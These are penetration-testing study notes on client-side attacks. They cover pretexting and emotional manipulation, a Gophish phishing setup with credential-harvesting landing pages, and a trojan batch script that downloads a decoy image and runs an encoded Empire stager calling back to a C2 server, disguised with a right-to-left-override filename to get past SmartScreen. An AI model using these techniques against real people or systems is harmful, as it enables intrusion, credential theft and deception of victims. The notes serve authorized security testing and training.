# Client Side Attacks

Client-side attacks aim to exploit vulnerabilities or misconfigurations in client-side programs or to exploit the employees of companies to establish an initial foothold into an organizations networks.

These attacks are very effective and prevelent as humans are the weak link in an organizations security.

We are trying to get onto a client device in a network rather than attacking servers.

>[!IMPORTANT]
>The attacks we run will depend on the devices and software installed on the client machines

Due to the fact that client-side attacks usually need some kind of human interaction in order to work, social engineering comes into play when using them.

## Introductary Example

To get a better idea of how a client-side attack can work - consider the following fictitious but illustrative example.

We - the attackers - want to gain access to a company called Teszzla. We will use a client-side attack rather than a server attack to attempt to do this.

First, we research Teszzla using publicly available data. We look through their websites, social media and job postings. During this research we harvest names of employees and their roles in the company. We then gather data about the technology being used by Teszzla.

Next, we identify the best targets - employees - in Teszzla. We look for those who probably have access to the data we are after. We focus our recon on these employees and find out as much as we can about them using Open Source INTelligence methods.

After this, we develop our reources - maybe a trojan which uses a .png image or .pdf document tailored to our target. This will take into consideration what we know about the target *and* what we know about the technology being used by them.

We then establish the infrastructure we need in order to deliver the payload - maybe we clone a website, link it to a sneaky domain and start a file-sharing service along with a web server on the cloud.

Next, we work on creating a *pretext* for delivering the payload to the target - this might be a spear-phishing email to them which has a link to a malicious website which we have created. The malicious website may well be serving our trojans.

After this, we use social engineering techniques to deliver the payload and get the target to download a trojan.

Maybe the target downloads and opens the trojan. Malicious code will then execute on the *client* machine used by the target and call back to a *Command and Control* server which we have running on the cloud.

We have now gained access to the internal network of Teszzla via a client-side attack - notice how we had to hack a person as well as a computer.

The process of *post exploitation* begins.

### Client-Side Attack Methodology

Taking into consideration the example above - we can put together a high-level attack chain for a client-side attack - see it as a workflow :smiley:

- Reconnaissance
- Target Identification
- Resource Development
- Delivery
- Execution
- Post-Exploitation

## Client-Side Attack Vectors

Here are some common client-side attack vectors we can use to gain initial access to target networks.

### Social Engineering

The process of getting people to do things we want them to do which they wouldnt ordinarily do. We will go into these techniques in greater detail later - but as an overview social engineering includes:

- Phishing Emails
    - crafted emails to trick targets into clicking on malicious links or download malicious files
- Spear-Phishing Emails
    - phishing emails which are highly targeted due to extensive recon of the target
- Social Media Engineering
    - fake profiles used to establish connections and trust with targets and then get them to click on malicious links or downloads
- Pretexting
    - establishing a narrative to use to deceive the target
- Baiting
    - enticing the target to click on a malicious link or download malicious files
- Tailgating
    - establishing a relationship with the target and then using it to physically gain access to an organizations premises and therefore internal network

### Malicious Files

These can be any kind of file - .png .pdf. .docx etc - which have malicious content designed to execute once the file has been opened.

### Drive-By Downloads

We poison a compromised website or we create a website which contains malicious content - this is crafted so it is automatically downloaded and executed when a target visits the website.

### Watering Hole Attacks

Injecting malicious code to websites which we know are visited by the target.

### USB Attacks

We leave a poisoned USB stick somewhere a target will find it - the hope is they will be curious and mount it on a company machine. The stick will be infected with malware which automatically executes once the device has been mounted.

### Exploit Kits

These are kits such as BEEF which exploit client-side software - they make our life easier as attackers.

## Information Gathering

As always, the data we gather in this stage of the attack chain is of vital importance to the whole operation.

When it comes to recon for client-side attacks, we need to gather data about human targets as well as the software they are using and its configuration.

>[!IMPORTANT]
>Just knowing about the target - email address, interests etc - is not enough - we must know about the technology stack they are using, too

### Passive Techniques

We can use *passive* techniques to gather data about targets and the technology which is being used by an organization. These techniques include the following:

- Google Dorks
- Maltego
- The Harvester

### Active Techniques

We can use *active* techniques to gather data. These techniques include:

- Client Fingerprinting
- Social Engineering

#### Client Fingerprinting

Since data regarding client machines is not publicly available, we need to use an *active* information gathering technique such as *client fingerprinting* in order to obtain it.

A common way of fingerprinting a client machine is to use a phishing email to socailly engineer a target employee in an organization to visit a malicious webpage which contains code which will extract data regarding the client machines browser, plugins, extensions and operating system.

A good exploit kit to achieve this is BEEF - there are notes on how to use this framework as my repo on [hacking using the cloud | beef](https://github.com/puzz00/hacking-using-the-cloud/blob/main/hacking-using-the-cloud.md#hacking-web-browsers)

The `Details` tab of a hooked browser provides lots of useful data - it essentialy fingerprints the browser and even gives us the OS being used.

## Social Engineering

Social engineering is quite simply the art of getting people to do things we want them to do which they wouldnt normally do.

It is a vast field and it is as old as the hills. We find social engineering being used in just about every crime we can think of - from con men getting their victims to send them money to serial killers getting people to enter their cars.

Some white hat penetration testers find studying this area uncomfortable - seeing it as being unethical. It is - however - widely used by threat actors from teenage hackers - with or without autism - to nation state sponsored Advanced Persistent Threat groups - it is therefore vitally important to learn how to do it so we can better protect our clients.

>[!IMPORTANT]
>If we find it cynical or feel manipulative when performing social enginnering attacks against employees of companies we are working for - we need to remember that we have been tasked to find security vulnerabilities so as to *help* the employees - better we find that the company needs to invest more in staff anti-phishing training than they fall prey to a real attacker

### Social Engineering Basics

In these notes we are focusing on social engineering in the context of attempting to gain access to a network so we can further our attack on the target organization.

We are aiming to find ways to manipulate people so they help us realize our goals. We will be seeking to use psychology in different ways to exploit human emotions and desires to get employees to act in a way which compromises the security of their employer. These actions may well seem small and inconsequential - an employee letting us know whether they use windows or a mac for example.

The human mind is complex and there are many ways we can seek to hack it. Here are some common human tendencies which are exploited during a social engineering campaign:

- Wanting to be helpful
- Trust
- Needing approval or to be liked
- Fear
- Wanting to avoid conflict

It is worth considering the power of social engineering - instead of spending hours messing about with server side attacks we can gain access to a network within minutes via a well carried out hack of an employee - this is one of the reasons it is so popular with threat actors.

>[!NOTE]
>With the rise of social media - social engineering has *massively* risen in importance and effectiveness - looking at profiles is well worth taking the time to do

### Pretexting

Pretexting is important - we are establishing a relationship based on trust with a target.

When we create a pretext we are trying to make things seem as normal as possible for the target. This can take time - we are creating a relationship with the target. This relationship will be based on a false pretext - we will be pretending to be somebody we are not such as a colleague or a member of a service provider - there are many more examples.

>[!TIP]
>This one is from Sun Zi - engage people with what they expect | it is what they are able to discern and confirms their projections | it settles them into predictable patterns of response | occupying their minds while we wait for the extraordinary moment | that which they cannot anticipate

The point is that people are more likely to trust people they feel as though they know and are comfortable with - they are less likely to act as we want them to if our messages or requests come out of nowhere - our requests need to come out of the pretext.

>[!NOTE]
>Creating a good pretext narrative comes from quality reconaissance - we need to get to know how the organization typically works - which departments do they have - what is their general company ethos or way of doing things etc

#### Pretexting Defining Characteristics

Here we will look at some general characteristics which make up a pretexting campaign.

##### False Pretense

False pretense simply means that we get the target to believe we are who we say we are. Our aim is to get the target to trust their interaction with us. This includes techniques such as making sure our emails look legitimate or professional and do not end up in the spam folder. We are creating our made up story by pretending to be somebody who has a real and innocent need to ask for information.

##### Trust Establishment

Through the pretext we foster our relationship with the target and seek to gain their trust.

During this phase we will be thinking psychology - how can we get the target to connect with us - maybe by showing a shared interest with them or reflecting their tone and use of language in email correspondence.

These are just *electronic forms* of physical techniques we can use to build a rapport with somebody. For example - when sitting and talking with people who may at first be unwilling to share much with us - we can generally exploit techniques such as subtly mirroring their body language and repeating words they have said and changing our phrasing and tone of voice to match theirs to make them feel more relaxed and to establish a connection with them - this in turn will lead to the person sharing more with us - perhaps more than they would have originally intended.

##### Manipulation of Emotions

In this phase we seek to exploit the emotions of the target. Which emotion or emotions and how is very specific to what we have ascertained about the person.

Generally speaking we can focus on areas such as inquisitiveness | sympathy | needing approval | fear | greed and urgency.

>[!IMPORTANT]
>The manipulation of emotions needs to be done in a subtle way from the pretext and relationship we have already created

A target is *much* more likely to click on a link which they are curious about from a contact they feel comfortable with than on a link in a random email which drops out of nowhere and is riddled with spelling mistakes and dodgy grammar. Hey - who knew - it turns out my long lost uncle is really a prince who needs to get a load of money out of :nigeria: INSERT COUNTRY NAME HERE :nigeria: - great - I get to keep 33% of it if I let him transfer it into my bank account :grin:

##### Data Extraction

Data extraction must be done after the pretext and trust have been established. The data extraction works hand-in-hand with the manipulation of emotions - we might for example prey on an employees fear of messing something important up or their desire to be helpful and win approval.

##### Consistency

We must work hard at maintaining consistency in our interactions with targets. We want our pretext to remain plausible - ideally the target wont even know they have been manipulated.

This will require us to undertake thorough reconaissance of targets and the organizations they work for. We will need to be flexible and able to quickly adapt our responses and techniques according to the behaviour of the target.

#### Pretexting Email Templates

For some examples of email templates which can be adapted and used as pretexts in phishing campaigns - please see [phishing pretexts](https://github.com/L4bF0x/PhishingPretexts)

## Phishing Campaigns Using Gophish

In this section we will look at how we can use `gophish` to run a *phishing* campaign.

### Why Gophish

Gophish is a tool to help us conduct phishing simulations for clients. It has functionality which enables us to create, run and analyze phishing campaigns.

We can use the data we get from it to help organizations understand how well they are doing - or not - when it comes to anti-phishing measures. This in turn can aid education of employees and thereby improve resistence to phishing as we can show them what we did and how that could impact on the organization.

>[!IMPORTANT]
>We need to provide our clients with data from phishing simulations - how many employees clicked on malicious links, how many entered credentials to fake web apps etc

Gophish is great for sharing the data collected as if we run it on [the cloud](https://github.com/puzz00/hacking-using-the-cloud/blob/main/hacking-using-the-cloud.md) we can give relevant members of the organization direct access to it.

### Features of Gophish

Gophish has lots of useful features which are outlined below.

#### Creating Campaigns

We can create unique campaigns using gophish. These can be crafted to work for specific departments in the organizations we are working with. We can run more than one campaign and each can be customized.

#### Template Editor for Emails

The email template editor in gophish lets us design professional looking emails before we send them - we can see what they will look like in the editor so we do not have to mess about sending them to email accounts and checking them in that way.

#### Managing Targets

We can manage targets easily in gophish by grouping them according to criteria such as which department they work in, their job role or where they are based. This means we can set up a campaign and then launch it to specific groups of targets. This enables us to make our phishing campaigns very targetted.

#### Creating Landing Pages

Gophish makes it easy to create fake landing pages which we can use in our phishing campaigns. These pages can imitate real login pages - gophish will steal entered credentials and save them for us. We can loot other sensitive data as well as username:password combinations.

>[!NOTE]
>My notes on [hacking using the cloud](https://github.com/puzz00/hacking-using-the-cloud/blob/main/hacking-using-the-cloud.md) show more manual ways we can create phishing webpages to loot credentials and attack web browsers

#### Data Collection and Reports

Gophish tracks activity relating to our phishing campaigns such as how many users clicked on links, entered credentials etc - these data can then be put into reports automatically which can be shared with clients.

#### Automation

We can automate phishing campaigns which can be scheduled to run on specified dates and times. We can create campaigns which repeatedly run in this way which is useful if our client asks us to run several campaigns over a period of time in order to see if anti-phishing strategies they have implemented are being successful or not.

### Phishing with Gophish

In this section we will look at some examples of using `gophish` over the cloud to send phishing emails to targets and to harvest credentials from a malicious landing page.

>[!NOTE]
>We will not be going over how to set up servers on the cloud as this has been covered in my notes on [hacking using the cloud](https://github.com/puzz00/hacking-using-the-cloud/blob/main/hacking-using-the-cloud.md) We are assuming a cloud server is already in operation - if not please read my aforementioned notes

#### Installing Gophish on our Cloud Server

We will download the github repo for [gophish](https://github.com/gophish/gophish.git) and then clone into it using `git clone https://github.com/gophish/gophish.git` The `/opt` directory is a good place to download *optional* packages such as *gophish* - we can give our *kali* user ownership of it using `sudo chown kali:kali /opt`

>[!IMPORTANT]
>We need to have `go` installed on our server - we can do so using `sudo apt install golang-go`

![gp1](/images/gp1.png)

![gp2](/images/gp2.png)

We next build a *gophish* binary by navigating into the gophish directory using `cd /opt/gophish` and then running `go build`

>[!NOTE]
>Errors thrown relating to *sqlite3* seem to always occur but are not important so we can ignore them

![gp3](/images/gp3.png)

![gp4](/images/gp4.png)

#### Initial Configuration

We first of all need to change the default url from `127.0.0.1` to `0.0.0.0` since we want to accept traffic from IP addresses other than just the `localhost` We can edit this using `nano /opt/gophish/config.json`

![gp5](/images/gp5.png)

##### Setting Gophish to be a System Service

We can now establish *gophish* as a system service. We can do this by creating a configuration file using `sudo nano /etc/systemd/system/gophish.service` We need to enter details for the service to run properly - the following code can be amended as is needed:

```bash
[Unit]
Description=gophish-service

[Service]
Type=simple
WorkingDirectory=/opt/gophish/
ExecStart=/opt/gophish/gophish

[Install]
WantedBy=multi-user.target
```

![gp6](/images/gp6.png)

We next need to *enable* the gophish service using `sudo systemctl enable gophish.service`

Once we have done this we can start and stop the service as well as checking its status.

We will need to first of all start the gophish service - we can do this using `sudo service gophish start`

>[!IMPORTANT]
>We see default credentials when we start the *gophish service* - we need to note these down somewhere safe

![gp7](/images/gp7.png)

##### Accessing the Gophish Admin Panel

Since gophish runs over port 3333 we will need to add an inbound rule to our cloud server to allow traffic on that port.

![gp8](/images/gp8.png)

We can then visit the IP address of our server along with port 3333 and log into the gophish admin panel using the default credentials which we noted down when we started the gophish service.

![gp9](/images/gp9.png)

![gp10](/images/gp10.png)

#### Linking Our Server to a Domain

We can add a *DNS* `A` record for our server and then open port 80 to allow inbound traffic.

![gp11](/images/gp11.png)

![gp12](/images/gp12.png)

![gp13](/images/gp13.png)

>[!TIP]
>All of this is covered in my notes on [hacking using the cloud](https://github.com/puzz00/hacking-using-the-cloud/blob/main/hacking-using-the-cloud.md) - they go over getting domain names and editing inbound security rules etc

#### Getting a Certificate

We need to get a certificate so we can get rid of nasty warnings thrown by browsers and to make targets feel more at ease visiting our malicious landing pages.

We first of install *certbot* on our cloud server using `sudo apt install certbot`

![gp14](/images/gp14.png)

We next generate a cert and a key - we will need to solve a challenge during this process.

First of all we run `sudo certbot certonly -d astrobin.loginpage.world --manual --preferred-challenges dns` and provide an email along with acceptance of the terms of use and - probably - nonacceptance of mailing from the EFF.

We will be given a challenge to solve - we just need to copy the value given and add it to a `TXT` record in our name registrar DNS area.

![gp15](/images/gp15.png)

![gp16](/images/gp16.png)

We will get the cert and key - it is useful to keep note of the paths to these.

![gp17](/images/gp17.png)

We now need to reconfigure the `config.json` file so gophish works with TLS over port 443 `sudo nano /opt/gophish/config.json`

![gp18](/images/gp18.png)

Next we open port 443 on our cloud server.

![gp19](/images/gp19.png)

The gophish service will need to be restarted - we can do this by stopping it and then starting it again using `sudo service gophish stop` followed by `sudo service gophish start`

![gp20](/images/gp20.png)

The phishy server are starting to look better with a padlock and https enabled.

![gp21](/images/gp21.png)

#### Getting an Account with an Email Registrar

We want to get an account with an email registrar who offers SMTP services. There are lots out there - for this example we are going to use [brevo](https://www.brevo.com/)

We do not need to enter credit card details in order to get a free account. We will need to give a phone number which we have access to as they use it to validate the account.

![gp22](/images/gp22.png)

Once we have our account we need to add a domain which we own to our account.

![gp23](/images/gp23.png)

The next step is to get the necessary DNS records established - `MX` records and `TXT` records for `DKIM` and `SPF` This is easy with *brevo* as they can automate it. If we are using other providers such as [mailgun](https://www.mailgun.com/) we need to do this manually - the instructions are clear and we just follow them step-by-step.

>[!NOTE]
>We do need to provide credit card details to get a properly functional account with *mailgun*

![gp24](/images/gp24.png)

The next step is to create a new *sender* - we dont want to use the default *postmaster* as we want to make our emails look more authentic.

>[!TIP]
>Make the sender or senders relevant to the target

![gp25](/images/gp25.png)

![gp26](/images/gp26.png)

We are now ready to head over to gophish and start creating the templates and profiles we need in order to launch a phishing campaign.

![gp27](/images/gp27.png)

#### Creating Templates and Profiles in Gophish

We need to create the following before we can launch a phishing campaing in gophish:

- Sending Profile
- Landing Page
- Email Template
- Users and Groups

##### Sending Profile

We can start by creating a *Sending Profile* which links to our *SMTP* service account with *brevo*

We give our profile a name which is used inside gophish to distinguish it from other profiles.

We specify the *Interface Type* to be `SMTP`

In the *SMTP From* field we add the name of one of our *senders* we created in brevo.

We put the name of our SMTP server and its port into the *Host* section.

>[!IMPORTANT]
>Use port 587 *NOT* 25 for your SMTP server - gophish does not seem to work with port 25

The fields in the *Username* and *Password* sections need to be the data we got from brevo relating to our username:password credentials - these will be used by gophish to authenticate to our SMTP account.

![gp67](/images/gp67.png)

##### Landing Page

The landing page is what the targets will see if they click the malicious link we provide in our phishing email.

We can craft our own webpage in the gophish editor using html and css or we can import websites which are already in existance. The latter method is easier and leads to more authentic looking sites.

![gp68](/images/gp68.png)

We can specify that we want gophish to capture submitted data and if we want we can also capture submitted passwords - this is achieved by simply clicking buttons - no knowledge of *php* necessary.

The target can be redirected to a different or the same website once they have submitted data. It is common to redirect back to the login page of the *authentic* website - this just leads the target to believe they fat-fingered their login credentials.

![gp69](/images/gp69.png)

##### Email Templates

Here we can craft what our phishing emails look like. We can have lots of fun bringing into play our *socail enginnering* skills and use our *pretext*.

>[!TIP]
>Dont just copy a pretexting template directly into the email template editor - spam filters are more likely to recognise them as malicious and drop them into the spam folder if we do this - as always - the more unique the better

When working on the email template we can use plain text or html and css. If we are using html and css it is fun to try to create an email which looks like it has come from a genuine organization. We can copy their color palette and include a logo for example. This takes a little longer but looks better. In this example we have just created a plain looking email.

We can add an *Envelope Sender* which if used will be the details shown to the target in their inbox. It is generally easy to bypass filters if we use a name from a domain we own and have linked to our SMTP service account but it is more difficult and problematic if we attempt to impersonate a different domain - our emails will tend to end up in spam or with weird email extensions if we attempt this.

>[!NOTE]
>If too many of our emails end up in spam or we are attempting to impersonate users from domains we do not own it is likely that our smtp service accounts will be blocked or deleted and our links fail to work - not great - we dont want out IP address to end up on blacklists

![gp70](/images/gp70.png)

##### Users and Groups

This is where we can manage our targets. We can add them individually or in bulk via an import.

>[!NOTE]
>We can use gophish syntax in our email templates to pull in data from the users such as `{{.FirstName}}` which means we can easily make our emails more personal - better to have `Dear John` than `Dear User`

![gp71](/images/gp71.png)

#### Launching a Phishing Campaign

With everything set we can now launch a phishing campaign. This is really still a test so in this example we are just sending our phishing email to one user. This will let us test to see where the email ends up - gophish does not tell us if it lands in an inbox or spam - it just tells us that the email has been sent - unless it hasnt in which case we will get an error.

>[!NOTE]
>We havent tweaked our gophish configuration to make it less detectable yet so our test email at this point might end up in spam - this is just to make sure things are being sent | recieved and the landing page works

![gp72](/images/gp72.png)

![gp73](/images/gp73.png)

#### Our First Test Campaign

In this example we are using a simple html form on our landing page - yes it looks sus and basic because it is sus and basic but we are just making sure things work as we want them to.

Using a [ten minute email](https://10minutemail.com/) we find our phish comes through fine and we click on the link. We see our form and input some credentials.

![gp33](/images/gp33.png)

Notice the `rid` parameter in the url - this is a unique value set by gophish - each email will have a different value so gophish can track who clicked on links | entered data etc

We can change the name of the parameter to make it less fishy - not many web apps use `rid` so people looking carefully may well be put off by it.

Back in our gophish admin area we see how the neat and clean interface is tracking our campaign in real time - remember - data is *vitally* important when running social engineering and phishing simulations for clients.

![gp34](/images/gp34.png)

![gp35](/images/gp35.png)

#### Reconfiguring Gophish to Make it Less Fishy

## Resource Development

In this section we will be looking at how we can craft malicious resources to use against our targets.

### Developing Trojan Horses

We all know the story of the original Trojan Horse from Greek mythology. In cyber security a trojan is simply a malicious piece of code - for example a meterpreter reverse shell, empire stager, keylogger, custom reverse shell - which runs in the background behind an innocent file such as a .png .pdf or .exe

The idea is that the target will see the innocent side but not the malicious one - no sweaty Greek men need to be involved :relieved: 

Essentially a trojan needs to look and act like a normal file but at the same time execute malicious code in the background.

>[!NOTE]
>There are lots of ways to develop and deliver trojans - we will cover some of them which will hopefully be of use :smiley: 

#### Using Powershell in a Batch Script

The idea is simple - we will create a .bat script which will use powershell to download and execute an innocent file and then execute malicious code.

Once we have this working we will polish the look of the trojan to make it as believable as possible. Social engineering will greatly assist in getting the target to open the trojan but there are some tricks we can use to make it more likely that they will fall for it.

##### Serving Necessary Files

In order for this method to work the trojan will need to be able to download the necessary files from somewhere. We can serve these ourselves using an opensource file sharing service called [pwndrop](https://github.com/kgretzky/pwndrop)

>[!NOTE]
>We can use a cloud server to host pwndrop but in these notes we are working on a local area network

After we have cloned the pwndrop repo and navigated into it we can use `make` to prepare it for installation. We can then use `make install` to install it.

>[!IMPORTANT]
>We need to have go installed on our system for the installation of pwndrop to work - we can get this on kali using `sudo apt install golang-go`

Once we have installed pwndrop it will be running. We can stop, start and check its status using `service` commands such as `sudo service pwndrop stop` or we can use `/usr/local/pwndrop/pwndrop/stop`

We can now access the login panel of pwndrop via a web browser. Since we are working on a LAN we can just use the IP address of the server or `localhost` but if we have installed pwndrop on a cloud server which has a domain name associated with it we can use the domain name.

The admin panel is found at `http://localhost/pwndrop/` - we will need to change `localhost` to a domain name if working with it on the cloud and a domain we have purchased.

>[!TIP]
>The path to the admin panel can be changed in the settings once we have logged into pwndrop

When we first log into pwndrop we will need to create a username:password which we can use for subsequent access to it.

It is very easy to use and is mostly self explanatory.

One thing to notice is how pwndrop by default adds gibberish into the path of uploaded files. I find this makes urls less believable and therefore like to delete it - this can be done in the settings for each individual file.

![pwndrop1](/images/3.png)

In this example we are creating a trojan for a target who is interested in astrophotography. The .png is therefore related to this interest.

We will be using a simple empire stager as the malicious payload.

![empire1](/images/1.png)

![empire2](/images/2.png)

With our pwndrop server now serving we can access the .png file we need for the frontend of our trojan.

![pwndrop2](/images/4.png)

##### Creating the Batch Script

The .bat script we create will first of all use `cd %TEMP%` to navigate into the `Temp` directory. This is so the target will not see suspicious files appearing on their file system - most people never navigate to it.

It will then use powershell to download the innocent .png file we are serving. Since this powershell command will be executed from within a batch script we will need to explicitly state we want to use powershell: `Powershell -Command "Invoke-WebRequest 'http://192.168.56.101/witch-head.png' -OutFile 'witch-head.png'"`

We will then open the .png file so the target believes they have just opened it in a normal way even though they have not. We can open it by simply using `witch-head.png`

Next we will execute the malicious code which in this case is the base64 encoded empire multi stager.

![trojan1](/images/5.png)

The following code is the complete batch script as run in this example:

```
cd %TEMP%
Powershell -Command "Invoke-WebRequest 'http://192.168.56.101/witch-head.png' -OutFile 'witch-head.png'"
witch-head.png
powershell -nop -sta -w 1 -enc SQB<SNIP>AFM
```

Once we have crafted our malicious batch script and saved it as a .bat file we can try executing it.

![trojan3](/images/7.png)

![trojan4](/images/8.png)

At this point we have a working trojan - okay - not many if any people are going to open that dodgy looking batch file - though with good social engineering some will - so we will next work on making it look more legitimate.

##### Converting .bat to .exe and Adding an Icon

At this point we have a trojan which works but looks suspicious.

![trojan6](/images/6.png)

We want to make it look more like a .png as in this example we are using a .png file as the cover for the malicious code.

We can turn the .bat script into an .exe file using a .bat to .exe [conversion tool](https://github.com/tokyoneon/B2E)

This is a good tool because we can add an .ico to make the file look more like a .png and we can choose to make `Exe-Format` option `(Invisible)` which means the target will not see the script run.

>[!TIP]
>We can easily create an .ico file using an online .png to .ico conversion tool - there are lots of them

![trojan7](/images/9.png)

Once we have finished converting the .bat file to an .exe file as described above the trojan will look more believable.

![trojan8](/images/10.png)

>[!NOTE]
>Windows by default does not show file extensions so we do not at this point need to worry about .exe showing and scaring the target - there is a trick we can use to help with this which will soon see

If we open the trojan now we find that no warnings pop up and no scary scripts can be seen running - we just see what the target would expect to see - a .png image of the witch-head nebula.

![trojan9](/images/11.png)

The malicious code has still been executed in the background and we find a new agent has checked into our empire C2 server.

![trojan10](/images/12.png)

This means our trojan is more likely to be executed by the target.

The next question relates to delivery methods. If we have managed to get the trojan to the target in a way which does not use the internet - for example on a USB stick - then the trojan will work as we have seen.

In most cases though we will be delivering the trojan using the internet in some way or form. This raises the problem of the browser showing the real file extension of .exe when the trojan is being downloaded and Defender SmartScreen warning the target that they are opening an executable. We will look at some ways we can mitigate these problems next.

##### Dealing with the .exe Extension and Pesky Defender SmartScreen

When we upload our trojan to pwndrop we see that it has an .exe file extension after our .png fake one.

![trojan11](/images/13.png)

If the target downloads this as it is they will be able to see the .exe file extension since the browswer will display it on the file name.

We can get around this by creating a zip archive of several files. In this example we zip three pictures of astrophotography. Since this is Proof Of Concept we only make one of them a trojan. In reality we would make them all trojans.

![trojan12](/images/14.png)

![trojan13](/images/15.png)

![trojan14](/images/16.png)

The next problem is Defender SmartScreen giving the target a warning not to open the file which has been downloaded because it is an unrecognised app.

We can use social engineering techniques to get around this.

![trojan15](/images/17.png)

![trojan16](/images/18.png)

Another problem this causes is that the scary .exe file extension has reared its ugly head again. Fortunately we can use a trick to hide it.

We will use the *right-to-left override* character which can be found online in different places - one such place can be found [here](https://unicode-explorer.com/c/202E)

The idea is simple - we will think of a word which ends exe or nearly ends exe - in this case we use annexe hoping the target doesnt think too much of it - maybe an annexe of photos!

We then craft a file name such as `astro-backyard-1-anngnp.exe`

The `gnp.exe` part will have the right-to-left override character applied to it so it will read as `exe.png` which will make the whole sneaky filename read as `astro-backyard-1-annexe.png`

![trojan17](/images/19.png)

![trojan18](/images/20.png)

![trojan19](/images/21.png)

![trojan20](/images/22.png)

The target will still be warned when they open the trojan but the scary .exe file extension is no longer visible - it looks like a legit .png because SmartScreen doesnt pick up on the fact that the RLO character has been used.

In our social engineering we can play on the fact that the .png is from an unknown publisher and this is why Defender gives a warning. There are other techniques we can use too - these are to be covered in the social engineering section of these notes :smiling_imp: 

![trojan21](/images/23.png)

>[!TIP]
>We dont have to use a word which ends exactly exe - we can just add an e to words which end ex - targets will tend to see this as a typo - especially if they are very keen to open the image - why does `sexe` spring to mind? We could also register a domain name such as `galexe` and use it in our file names